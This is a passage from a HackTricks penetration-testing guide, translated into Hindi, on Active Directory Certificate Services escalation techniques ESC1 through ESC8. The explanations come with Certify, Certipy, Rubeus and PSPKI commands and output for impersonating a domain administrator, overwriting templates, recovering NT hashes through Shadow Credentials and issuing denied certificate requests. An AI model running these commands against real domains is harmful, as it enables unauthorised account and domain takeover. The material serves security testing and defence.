# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}

**यह पदों के उत्थान तकनीक अनुभागों का सारांश है:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explanation

### Misconfigured Certificate Templates - ESC1 Explained

- **Enterprise CA द्वारा निम्न-विशिष्ट उपयोगकर्ताओं को नामांकन अधिकार दिए जाते हैं।**
- **प्रबंधक की स्वीकृति की आवश्यकता नहीं है।**
- **अधिकृत व्यक्तियों से कोई हस्ताक्षर आवश्यक नहीं हैं।**
- **प्रमाणपत्र टेम्पलेट्स पर सुरक्षा विवरण अत्यधिक अनुमति देने वाले हैं, जो निम्न-विशिष्ट उपयोगकर्ताओं को नामांकन अधिकार प्राप्त करने की अनुमति देते हैं।**
- **प्रमाणपत्र टेम्पलेट्स को EKUs को परिभाषित करने के लिए कॉन्फ़िगर किया गया है जो प्रमाणीकरण को सुविधाजनक बनाते हैं:**
- Extended Key Usage (EKU) पहचानकर्ता जैसे Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), या कोई EKU (SubCA) शामिल हैं।
- **प्रमाणपत्र हस्ताक्षर अनुरोध (CSR) में subjectAltName शामिल करने की क्षमता टेम्पलेट द्वारा अनुमति दी गई है:**
- Active Directory (AD) पहचान सत्यापन के लिए प्रमाणपत्र में subjectAltName (SAN) को प्राथमिकता देता है यदि यह मौजूद है। इसका मतलब है कि CSR में SAN निर्दिष्ट करके, किसी भी उपयोगकर्ता (जैसे, एक डोमेन प्रशासक) का अनुकरण करने के लिए एक प्रमाणपत्र का अनुरोध किया जा सकता है। यह दर्शाता है कि क्या अनुरोधकर्ता द्वारा SAN निर्दिष्ट किया जा सकता है, प्रमाणपत्र टेम्पलेट के AD ऑब्जेक्ट में `mspki-certificate-name-flag` प्रॉपर्टी के माध्यम से। यह प्रॉपर्टी एक बिटमास्क है, और `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` ध्वज की उपस्थिति अनुरोधकर्ता द्वारा SAN के निर्दिष्ट करने की अनुमति देती है।

> [!CAUTION]
> उल्लिखित कॉन्फ़िगरेशन निम्न-विशिष्ट उपयोगकर्ताओं को किसी भी पसंद के SAN के साथ प्रमाणपत्रों का अनुरोध करने की अनुमति देता है, जिससे Kerberos या SChannel के माध्यम से किसी भी डोमेन प्रिंसिपल के रूप में प्रमाणीकरण सक्षम होता है।

यह सुविधा कभी-कभी HTTPS या होस्ट प्रमाणपत्रों के तात्कालिक निर्माण का समर्थन करने के लिए उत्पादों या तैनाती सेवाओं द्वारा सक्षम की जाती है, या समझ की कमी के कारण।

यह नोट किया गया है कि इस विकल्प के साथ प्रमाणपत्र बनाने से एक चेतावनी उत्पन्न होती है, जो तब नहीं होती जब एक मौजूदा प्रमाणपत्र टेम्पलेट (जैसे `WebServer` टेम्पलेट, जिसमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` सक्षम है) को डुप्लिकेट किया जाता है और फिर प्रमाणीकरण OID शामिल करने के लिए संशोधित किया जाता है।

### Abuse

**कमजोर प्रमाणपत्र टेम्पलेट्स खोजने के लिए** आप चला सकते हैं:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
इस **कमजोरी का दुरुपयोग करके एक प्रशासक की नकल करने के लिए** कोई निम्नलिखित चला सकता है:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
फिर आप उत्पन्न **प्रमाणपत्र को `.pfx`** प्रारूप में परिवर्तित कर सकते हैं और इसे **Rubeus या certipy** का उपयोग करके फिर से **प्रमाणित** करने के लिए उपयोग कर सकते हैं:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows बाइनरी "Certreq.exe" और "Certutil.exe" का उपयोग PFX उत्पन्न करने के लिए किया जा सकता है: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD फॉरेस्ट के कॉन्फ़िगरेशन स्कीमा के भीतर प्रमाणपत्र टेम्पलेट्स की गणना, विशेष रूप से वे जो अनुमोदन या हस्ताक्षरों की आवश्यकता नहीं रखते हैं, जिनमें Client Authentication या Smart Card Logon EKU है, और जिनमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` ध्वज सक्षम है, निम्नलिखित LDAP क्वेरी चलाकर की जा सकती है:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Misconfigured Certificate Templates - ESC2

### Explanation

दूसरा दुरुपयोग परिदृश्य पहले वाले का एक रूपांतर है:

1. Enterprise CA द्वारा निम्न-privileged उपयोगकर्ताओं को नामांकन अधिकार दिए जाते हैं।
2. प्रबंधक अनुमोदन की आवश्यकता को अक्षम किया गया है।
3. अधिकृत हस्ताक्षरों की आवश्यकता को छोड़ दिया गया है।
4. प्रमाणपत्र टेम्पलेट पर एक अत्यधिक अनुमति देने वाला सुरक्षा वर्णनकर्ता निम्न-privileged उपयोगकर्ताओं को प्रमाणपत्र नामांकन अधिकार प्रदान करता है।
5. **प्रमाणपत्र टेम्पलेट को Any Purpose EKU या कोई EKU शामिल करने के लिए परिभाषित किया गया है।**

**Any Purpose EKU** एक हमलावर द्वारा **किसी भी उद्देश्य** के लिए प्रमाणपत्र प्राप्त करने की अनुमति देता है, जिसमें क्लाइंट प्रमाणीकरण, सर्वर प्रमाणीकरण, कोड साइनिंग, आदि शामिल हैं। इसी **तकनीक का उपयोग ESC3 के लिए** इस परिदृश्य का लाभ उठाने के लिए किया जा सकता है।

**कोई EKUs** नहीं होने वाले प्रमाणपत्र, जो अधीनस्थ CA प्रमाणपत्र के रूप में कार्य करते हैं, **किसी भी उद्देश्य** के लिए दुरुपयोग किया जा सकता है और **नए प्रमाणपत्रों पर हस्ताक्षर करने के लिए भी उपयोग किया जा सकता है**। इसलिए, एक हमलावर एक अधीनस्थ CA प्रमाणपत्र का उपयोग करके नए प्रमाणपत्रों में मनमाने EKUs या फ़ील्ड निर्दिष्ट कर सकता है।

हालांकि, **डोमेन प्रमाणीकरण** के लिए बनाए गए नए प्रमाणपत्र कार्य नहीं करेंगे यदि अधीनस्थ CA को **`NTAuthCertificates`** ऑब्जेक्ट द्वारा विश्वसनीय नहीं माना जाता है, जो डिफ़ॉल्ट सेटिंग है। फिर भी, एक हमलावर **किसी भी EKU** और मनमाने प्रमाणपत्र मानों के साथ **नए प्रमाणपत्र** बना सकता है। इन्हें संभावित रूप से **कई उद्देश्यों** (जैसे, कोड साइनिंग, सर्वर प्रमाणीकरण, आदि) के लिए **दुरुपयोग** किया जा सकता है और नेटवर्क में अन्य अनुप्रयोगों जैसे SAML, AD FS, या IPSec के लिए महत्वपूर्ण प्रभाव हो सकते हैं।

AD Forest के कॉन्फ़िगरेशन स्कीमा के भीतर इस परिदृश्य से मेल खाने वाले टेम्पलेट्स को सूचीबद्ध करने के लिए, निम्नलिखित LDAP क्वेरी चलाई जा सकती है:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misconfigured Enrolment Agent Templates - ESC3

### Explanation

यह परिदृश्य पहले और दूसरे के समान है लेकिन **भिन्न EKU** (Certificate Request Agent) और **2 भिन्न टेम्पलेट्स** का **दुरुपयोग** करता है (इसलिए इसमें 2 सेट आवश्यकताएँ हैं),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), जिसे Microsoft दस्तावेज़ में **Enrollment Agent** के रूप में जाना जाता है, एक प्रिंसिपल को **दूसरे उपयोगकर्ता** की ओर से **सर्टिफिकेट** के लिए **नामांकित** करने की अनुमति देता है।

**“enrollment agent”** एक ऐसे **टेम्पलेट** में नामांकित होता है और परिणामस्वरूप प्राप्त **सर्टिफिकेट का उपयोग दूसरे उपयोगकर्ता** की ओर से एक CSR को सह-हस्ताक्षरित करने के लिए करता है। फिर यह **सह-हस्ताक्षरित CSR** को CA को **भेजता** है, एक **टेम्पलेट** में नामांकित होता है जो **“की ओर से नामांकित”** की अनुमति देता है, और CA **“दूसरे” उपयोगकर्ता** के लिए एक **सर्टिफिकेट** के साथ प्रतिक्रिया करता है।

**Requirements 1:**

- Enterprise CA द्वारा निम्न-privileged उपयोगकर्ताओं को नामांकन अधिकार दिए जाते हैं।
- प्रबंधक अनुमोदन की आवश्यकता को छोड़ दिया गया है।
- अधिकृत हस्ताक्षरों की कोई आवश्यकता नहीं है।
- सर्टिफिकेट टेम्पलेट का सुरक्षा वर्णनकर्ता अत्यधिक अनुमति देने वाला है, जो निम्न-privileged उपयोगकर्ताओं को नामांकन अधिकार प्रदान करता है।
- सर्टिफिकेट टेम्पलेट में Certificate Request Agent EKU शामिल है, जो अन्य प्रिंसिपलों की ओर से अन्य सर्टिफिकेट टेम्पलेट्स के अनुरोध की अनुमति देता है।

**Requirements 2:**

- Enterprise CA निम्न-privileged उपयोगकर्ताओं को नामांकन अधिकार प्रदान करता है।
- प्रबंधक अनुमोदन को बायपास किया गया है।
- टेम्पलेट का स्कीमा संस्करण 1 है या 2 से अधिक है, और यह एक Application Policy Issuance Requirement निर्दिष्ट करता है जो Certificate Request Agent EKU की आवश्यकता है।
- सर्टिफिकेट टेम्पलेट में परिभाषित EKU डोमेन प्रमाणीकरण की अनुमति देता है।
- CA पर नामांकन एजेंटों के लिए प्रतिबंध लागू नहीं होते हैं।

### Abuse

आप इस परिदृश्य का दुरुपयोग करने के लिए [**Certify**](https://github.com/GhostPack/Certify) या [**Certipy**](https://github.com/ly4k/Certipy) का उपयोग कर सकते हैं:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**उपयोगकर्ता** जिन्हें **नामांकन एजेंट प्रमाणपत्र** प्राप्त करने की अनुमति है, उन टेम्पलेट्स में जिनमें नामांकन **एजेंट** नामांकित होने की अनुमति है, और **खाते** जिनके लिए नामांकन एजेंट कार्य कर सकता है, को एंटरप्राइज CA द्वारा सीमित किया जा सकता है। यह `certsrc.msc` **स्नैप-इन** को खोलकर, **CA पर राइट-क्लिक** करके, **गुण** पर क्लिक करके, और फिर “Enrollment Agents” टैब पर **नेविगेट** करके प्राप्त किया जाता है।

हालांकि, यह noted किया गया है कि CA के लिए **डिफ़ॉल्ट** सेटिंग “**नामांकन एजेंटों को प्रतिबंधित न करें**” है। जब नामांकन एजेंटों पर प्रतिबंध को प्रशासकों द्वारा सक्षम किया जाता है, तो इसे “Restrict enrollment agents” पर सेट करने पर, डिफ़ॉल्ट कॉन्फ़िगरेशन अत्यधिक अनुमति देने वाला रहता है। यह **Everyone** को सभी टेम्पलेट्स में नामांकित होने की अनुमति देता है।

## Vulnerable Certificate Template Access Control - ESC4

### **व्याख्या**

**प्रमाणपत्र टेम्पलेट्स** पर **सुरक्षा वर्णनकर्ता** उन **अनुमतियों** को परिभाषित करता है जो विशिष्ट **AD प्रिंसिपल** टेम्पलेट के संबंध में रखते हैं।

यदि एक **हमलावर** के पास **टेम्पलेट** को **बदलने** और **पिछले अनुभागों** में उल्लिखित किसी भी **शोषण योग्य गलत कॉन्फ़िगरेशन** को लागू करने के लिए आवश्यक **अनुमतियाँ** हैं, तो विशेषाधिकार वृद्धि को सक्षम किया जा सकता है।

प्रमाणपत्र टेम्पलेट्स पर लागू होने वाली महत्वपूर्ण अनुमतियाँ शामिल हैं:

- **Owner:** वस्तु पर निहित नियंत्रण प्रदान करता है, किसी भी विशेषता को संशोधित करने की अनुमति देता है।
- **FullControl:** वस्तु पर पूर्ण अधिकार सक्षम करता है, जिसमें किसी भी विशेषता को बदलने की क्षमता शामिल है।
- **WriteOwner:** हमलावर के नियंत्रण में एक प्रिंसिपल के लिए वस्तु के मालिक को बदलने की अनुमति देता है।
- **WriteDacl:** पहुँच नियंत्रण को समायोजित करने की अनुमति देता है, संभावित रूप से हमलावर को FullControl प्रदान करता है।
- **WriteProperty:** किसी भी वस्तु की संपत्तियों को संपादित करने की अनुमति देता है।

### दुरुपयोग

पिछले एक की तरह एक प्रिवेस्क का उदाहरण:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 तब होता है जब एक उपयोगकर्ता के पास प्रमाणपत्र टेम्पलेट पर लिखने के अधिकार होते हैं। इसे उदाहरण के लिए प्रमाणपत्र टेम्पलेट की कॉन्फ़िगरेशन को ओवरराइट करने के लिए दुरुपयोग किया जा सकता है ताकि टेम्पलेट ESC1 के लिए संवेदनशील हो जाए।

जैसा कि हम ऊपर के पथ में देख सकते हैं, केवल `JOHNPC` के पास ये अधिकार हैं, लेकिन हमारे उपयोगकर्ता `JOHN` के पास `JOHNPC` के लिए नया `AddKeyCredentialLink` एज है। चूंकि यह तकनीक प्रमाणपत्रों से संबंधित है, मैंने इस हमले को भी लागू किया है, जिसे [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) के रूप में जाना जाता है। यहाँ पीड़ित के NT हैश को पुनः प्राप्त करने के लिए Certipy के `shadow auto` कमांड का एक छोटा सा झलक है।
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** एक कमांड के साथ एक सर्टिफिकेट टेम्पलेट की कॉन्फ़िगरेशन को ओवरराइट कर सकता है। **डिफ़ॉल्ट** रूप से, Certipy कॉन्फ़िगरेशन को **ओवरराइट** करेगा ताकि यह **ESC1 के लिए संवेदनशील** हो जाए। हम **`-save-old` पैरामीटर** को भी निर्दिष्ट कर सकते हैं ताकि पुरानी कॉन्फ़िगरेशन को **सहेजने** के लिए, जो हमारे हमले के बाद कॉन्फ़िगरेशन को **पुनर्स्थापित** करने के लिए उपयोगी होगा।
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Explanation

ACL-आधारित संबंधों का विस्तृत जाल, जिसमें प्रमाणपत्र टेम्पलेट और प्रमाणपत्र प्राधिकरण के अलावा कई वस्तुएं शामिल हैं, AD CS प्रणाली की सुरक्षा को प्रभावित कर सकता है। ये वस्तुएं, जो सुरक्षा को महत्वपूर्ण रूप से प्रभावित कर सकती हैं, में शामिल हैं:

- CA सर्वर का AD कंप्यूटर ऑब्जेक्ट, जिसे S4U2Self या S4U2Proxy जैसे तंत्रों के माध्यम से समझौता किया जा सकता है।
- CA सर्वर का RPC/DCOM सर्वर।
- विशेष कंटेनर पथ `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` के भीतर कोई भी वंशज AD ऑब्जेक्ट या कंटेनर। इस पथ में, लेकिन सीमित नहीं है, कंटेनर और वस्तुएं जैसे कि प्रमाणपत्र टेम्पलेट्स कंटेनर, प्रमाणन प्राधिकरण कंटेनर, NTAuthCertificates ऑब्जेक्ट, और नामांकन सेवाएं कंटेनर शामिल हैं।

यदि एक निम्न-विशिष्टता वाला हमलावर इन महत्वपूर्ण घटकों में से किसी पर नियंत्रण प्राप्त करने में सफल होता है, तो PKI प्रणाली की सुरक्षा समझौता की जा सकती है।

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

[**CQure Academy पोस्ट**](https://cqureacademy.com/blog/enhanced-key-usage) में चर्चा किए गए विषय में **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ध्वज के प्रभावों पर भी प्रकाश डाला गया है, जैसा कि Microsoft द्वारा वर्णित है। यह कॉन्फ़िगरेशन, जब एक प्रमाणन प्राधिकरण (CA) पर सक्रिय किया जाता है, तो **किसी भी अनुरोध** के लिए **विभव-परिभाषित मानों** को **विषय वैकल्पिक नाम** में शामिल करने की अनुमति देता है, जिसमें Active Directory® से निर्मित अनुरोध भी शामिल हैं। परिणामस्वरूप, यह प्रावधान एक **घुसपैठिए** को **किसी भी टेम्पलेट** के माध्यम से नामांकित करने की अनुमति देता है जो डोमेन **प्रमाणीकरण** के लिए सेट किया गया है—विशेष रूप से वे जो **निम्न-विशिष्टता** उपयोगकर्ता नामांकन के लिए खुले हैं, जैसे कि मानक उपयोगकर्ता टेम्पलेट। परिणामस्वरूप, एक प्रमाणपत्र सुरक्षित किया जा सकता है, जिससे घुसपैठिए को डोमेन प्रशासक के रूप में या डोमेन के भीतर **किसी अन्य सक्रिय इकाई** के रूप में प्रमाणीकरण करने की अनुमति मिलती है।

**Note**: एक प्रमाणपत्र हस्ताक्षर अनुरोध (CSR) में **वैकल्पिक नामों** को जोड़ने के लिए `-attrib "SAN:"` तर्क के माध्यम से `certreq.exe` में, जो “नाम मान जोड़े” के रूप में संदर्भित है, ESC1 में SANs के शोषण रणनीति से एक **विभाजन** प्रस्तुत करता है। यहाँ, भेद **कैसे खाता जानकारी को संकुचित किया जाता है**—एक प्रमाणपत्र विशेषता के भीतर, न कि एक विस्तार में।

### Abuse

यह सत्यापित करने के लिए कि सेटिंग सक्रिय है या नहीं, संगठन निम्नलिखित कमांड का उपयोग कर सकते हैं `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
इस ऑपरेशन में मूल रूप से **रिमोट रजिस्ट्री एक्सेस** का उपयोग किया जाता है, इसलिए, एक वैकल्पिक दृष्टिकोण हो सकता है:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
जैसे कि [**Certify**](https://github.com/GhostPack/Certify) और [**Certipy**](https://github.com/ly4k/Certipy) इस गलत कॉन्फ़िगरेशन का पता लगाने और इसका लाभ उठाने में सक्षम हैं:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
इन सेटिंग्स को बदलने के लिए, यह मानते हुए कि किसी के पास **डोमेन प्रशासनिक** अधिकार या समकक्ष हैं, निम्नलिखित कमांड किसी भी कार्यस्थल से निष्पादित की जा सकती है:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
इस कॉन्फ़िगरेशन को अपने वातावरण में अक्षम करने के लिए, ध्वज को हटाया जा सकता है:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> मई 2022 की सुरक्षा अपडेट के बाद, नए जारी किए गए **certificates** में एक **security extension** होगा जो **requester's `objectSid` property** को शामिल करता है। ESC1 के लिए, यह SID निर्दिष्ट SAN से निकाला गया है। हालाँकि, **ESC6** के लिए, SID **requester's `objectSid`** को दर्शाता है, न कि SAN।\
> ESC6 का लाभ उठाने के लिए, यह आवश्यक है कि सिस्टम ESC10 (Weak Certificate Mappings) के प्रति संवेदनशील हो, जो **SAN को नए सुरक्षा विस्तार पर प्राथमिकता** देता है।

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

एक प्रमाणपत्र प्राधिकरण के लिए पहुँच नियंत्रण एक सेट अनुमतियों के माध्यम से बनाए रखा जाता है जो CA क्रियाओं को नियंत्रित करता है। इन अनुमतियों को `certsrv.msc` तक पहुँचकर, एक CA पर राइट-क्लिक करके, गुणों का चयन करके, और फिर सुरक्षा टैब पर जाकर देखा जा सकता है। इसके अतिरिक्त, PSPKI मॉड्यूल का उपयोग करके अनुमतियों को निम्नलिखित कमांड के साथ सूचीबद्ध किया जा सकता है:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
यह प्राथमिक अधिकारों के बारे में जानकारी प्रदान करता है, अर्थात् **`ManageCA`** और **`ManageCertificates`**, जो क्रमशः "CA प्रशासक" और "प्रमाणपत्र प्रबंधक" की भूमिकाओं से संबंधित हैं।

#### दुरुपयोग

एक प्रमाणपत्र प्राधिकरण पर **`ManageCA`** अधिकार होने से प्रमुख को PSPKI का उपयोग करके दूरस्थ रूप से सेटिंग्स को संशोधित करने की अनुमति मिलती है। इसमें **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ध्वज को टॉगल करना शामिल है ताकि किसी भी टेम्पलेट में SAN निर्दिष्ट करने की अनुमति मिल सके, जो डोमेन वृद्धि का एक महत्वपूर्ण पहलू है।

इस प्रक्रिया को PSPKI के **Enable-PolicyModuleFlag** cmdlet का उपयोग करके सरल बनाया जा सकता है, जो सीधे GUI इंटरैक्शन के बिना संशोधन की अनुमति देता है।

**`ManageCertificates`** अधिकारों का अधिग्रहण लंबित अनुरोधों की स्वीकृति को सुविधाजनक बनाता है, प्रभावी रूप से "CA प्रमाणपत्र प्रबंधक स्वीकृति" सुरक्षा को दरकिनार करता है।

**Certify** और **PSPKI** मॉड्यूल का संयोजन एक प्रमाणपत्र के लिए अनुरोध, स्वीकृति और डाउनलोड करने के लिए उपयोग किया जा सकता है:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explanation

> [!WARNING]
> In the **previous attack** **`Manage CA`** permissions were used to **enable** the **EDITF_ATTRIBUTESUBJECTALTNAME2** flag to perform the **ESC6 attack**, but this will not have any effect until the CA service (`CertSvc`) is restarted. When a user has the `Manage CA` access right, the user is also allowed to **restart the service**. However, it **does not mean that the user can restart the service remotely**. Furthermore, E**SC6 might not work out of the box** in most patched environments due to the May 2022 security updates.

इसलिए, यहाँ एक और हमला प्रस्तुत किया गया है।

Perquisites:

- केवल **`ManageCA` अनुमति**
- **`Manage Certificates`** अनुमति (को **`ManageCA`** से दी जा सकती है)
- प्रमाणपत्र टेम्पलेट **`SubCA`** को **सक्षम** होना चाहिए (को **`ManageCA`** से सक्षम किया जा सकता है)

यह तकनीक इस तथ्य पर निर्भर करती है कि `Manage CA` _और_ `Manage Certificates` पहुँच अधिकार वाले उपयोगकर्ता **असफल प्रमाणपत्र अनुरोध जारी कर सकते हैं**। **`SubCA`** प्रमाणपत्र टेम्पलेट **ESC1 के प्रति संवेदनशील** है, लेकिन **केवल प्रशासक** टेम्पलेट में नामांकित हो सकते हैं। इसलिए, एक **उपयोगकर्ता** **`SubCA`** में नामांकन के लिए **अनुरोध** कर सकता है - जिसे **अस्वीकृत** किया जाएगा - लेकिन **फिर बाद में प्रबंधक द्वारा जारी किया जाएगा**।

#### Abuse

आप **अपने लिए `Manage Certificates`** पहुँच अधिकार प्राप्त कर सकते हैं अपने उपयोगकर्ता को एक नए अधिकारी के रूप में जोड़कर।
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** टेम्पलेट को `-enable-template` पैरामीटर के साथ CA पर **सक्रिय किया जा सकता है**। डिफ़ॉल्ट रूप से, `SubCA` टेम्पलेट सक्रिय होता है।
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
यदि हमने इस हमले के लिए आवश्यकताओं को पूरा कर लिया है, तो हम **`SubCA` टेम्पलेट के आधार पर एक प्रमाणपत्र के लिए अनुरोध करना शुरू कर सकते हैं**।

**यह अनुरोध अस्वीकृत कर दिया जाएगा**, लेकिन हम निजी कुंजी को सहेज लेंगे और अनुरोध आईडी को नोट कर लेंगे।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
हमारे **`Manage CA` और `Manage Certificates`** के साथ, हम फिर **असफल प्रमाणपत्र** अनुरोध को `ca` कमांड और `-issue-request <request ID>` पैरामीटर के साथ **जारी** कर सकते हैं।
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
और अंत में, हम `req` कमांड और `-retrieve <request ID>` पैरामीटर के साथ **जारी किया गया प्रमाणपत्र** प्राप्त कर सकते हैं।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explanation

> [!NOTE]
> उन वातावरणों में जहाँ **AD CS स्थापित है**, यदि एक **वेब नामांकन अंत बिंदु जो कमजोर है** मौजूद है और कम से कम एक **प्रमाण पत्र टेम्पलेट प्रकाशित है** जो **डोमेन कंप्यूटर नामांकन और क्लाइंट प्रमाणीकरण** की अनुमति देता है (जैसे कि डिफ़ॉल्ट **`Machine`** टेम्पलेट), तो **स्पूलर सेवा सक्रिय होने वाले किसी भी कंप्यूटर को एक हमलावर द्वारा समझौता किया जा सकता है**!

AD CS द्वारा कई **HTTP-आधारित नामांकन विधियों** का समर्थन किया जाता है, जो अतिरिक्त सर्वर भूमिकाओं के माध्यम से उपलब्ध होती हैं जिन्हें प्रशासक स्थापित कर सकते हैं। HTTP-आधारित प्रमाण पत्र नामांकन के लिए ये इंटरफेस **NTLM रिले हमलों** के प्रति संवेदनशील होते हैं। एक हमलावर, एक **समझौता किए गए मशीन से, किसी भी AD खाते का अनुकरण कर सकता है जो इनबाउंड NTLM के माध्यम से प्रमाणीकरण करता है**। पीड़ित खाते का अनुकरण करते समय, इन वेब इंटरफेस को एक हमलावर द्वारा **`User` या `Machine` प्रमाण पत्र टेम्पलेट्स का उपयोग करके क्लाइंट प्रमाणीकरण प्रमाण पत्र के लिए अनुरोध करने के लिए एक्सेस किया जा सकता है**।

